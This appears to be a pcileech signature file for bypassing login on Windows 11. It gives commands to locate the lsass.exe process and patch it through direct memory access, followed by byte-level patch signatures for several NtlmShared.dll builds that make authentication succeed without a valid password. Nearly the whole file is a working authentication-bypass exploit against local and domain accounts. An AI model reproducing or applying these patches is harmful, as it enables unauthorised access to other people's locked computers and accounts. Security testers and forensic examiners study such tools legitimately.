# Unlock Signatures for Local and AD Accounts for Windows 11 x64 version
#
# Method 1: (faster):
# 1.1 check pid of lsass.exe: pcileech pslist
# 1.2 patch: pcileech patch -sig wx64_unlock_win11.sig -all -pid <pid_of_lsass>
#
# Method 2:
# 2.1 patch: pcileech patch -sig wx64_unlock_win11.sig -all
#
# Syntax: see signature_info.txt for more information.
# Generated on 2024-06-03 23:55:07
#
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.20348.1668 / 2023-03-30]
A7B,488BCB48FF15A3280000,A8D,0F84B2FAFFFF,A8D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.20348.887 / 2022-08-04]
A6B,488BCB48FF15B3280000,A7D,0F84B2FAFFFF,A7D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.1696 / 2023-03-09]
00B,488BCB48FF15E3220000,01D,0F84B2FAFFFF,01D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.2600 / 2023-11-08]
01B,488BCB48FF15D3220000,02D,0F84B2FAFFFF,02D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22000.778 / 2022-06-18]
F8B,488BCB48FF1563230000,F9D,0F84B2FAFFFF,F9D,0F85
#
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2067 / 2023-07-11]
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2506 / 2023-10-19]
# Signature for Windows 11 x64 [NtlmShared.dll 10.0.22621.2567 / 2023-10-14]
FC9,488D4B1048FF152C230000,FDC,0F85C4FAFFFF,FDC,909090909090
